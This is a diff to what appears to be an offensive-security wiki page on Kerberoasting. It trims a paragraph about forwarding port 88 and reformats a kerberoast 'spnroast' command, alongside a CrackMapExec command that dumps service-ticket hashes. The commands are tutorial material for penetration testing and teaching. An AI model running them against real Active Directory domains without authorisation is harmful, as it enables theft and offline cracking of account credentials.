@@ -36,12 +36,11 @@ This can also be achieved with [CrackMapExec](https://github.com/byt3bl33d3r/Cra
 crackmapexec ldap $TARGETS -u $USER -p $PASSWORD --kerberoasting kerberoastables.txt --kdcHost $KeyDistributionCenter
 ```
 
-If, for any reasons, you have to forward the Kerberos port (88 by default) from the target machine to your machine (for example, the port is only openned in local on the target, and you have to run something like `portfwd add -l 88 -p 88 -r 127.0.0.1` to access it from your machine), the Python3 packet [kerberoast](https://github.com/skelsec/kerberoast) can be pretty usefull.
+Another alternative is the [kerberoast](https://github.com/skelsec/kerberoast) pure-python toolkit.
 
 ```bash
-python3 kerberoast spnroast kerberos+pass://$domain\\$user:$password@127.0.0.1 -u $TargetUser -r $REALM
+python3 kerberoast spnroast kerberos+pass://"domain"\\"user":"password"@"target" -u "target_user" -r "realm"
 ```
-
 {% endtab %}
 
 {% tab title="Windows" %}
